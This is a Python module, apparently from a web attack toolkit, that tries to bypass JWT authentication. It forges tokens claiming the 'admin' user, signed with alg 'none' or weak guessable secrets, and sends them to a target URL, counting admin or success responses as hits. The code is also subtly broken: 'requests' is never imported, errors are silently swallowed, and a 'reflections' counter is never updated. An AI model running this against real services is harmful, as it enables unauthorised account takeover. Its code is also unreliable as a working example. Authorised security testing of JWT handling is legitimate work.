import jwt

def run(target):
    payloads = [
        {"alg": "none"},
        {"alg": "HS256", "secret": "admin"},
        {"alg": "HS256", "secret": "jwtsecret"},
        {"alg": "HS256", "secret": "changeme"}
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            token = jwt.encode({"user": "admin"}, payload.get("secret", ""), algorithm=payload["alg"])
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get(target, headers=headers, timeout=6)
            sent += 1
            if "admin" in r.text or "success" in r.text:
                hits += 1
        except:
            continue

    return {
        "module": "fuzz_jwt",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "JWT attack vector test"
    }
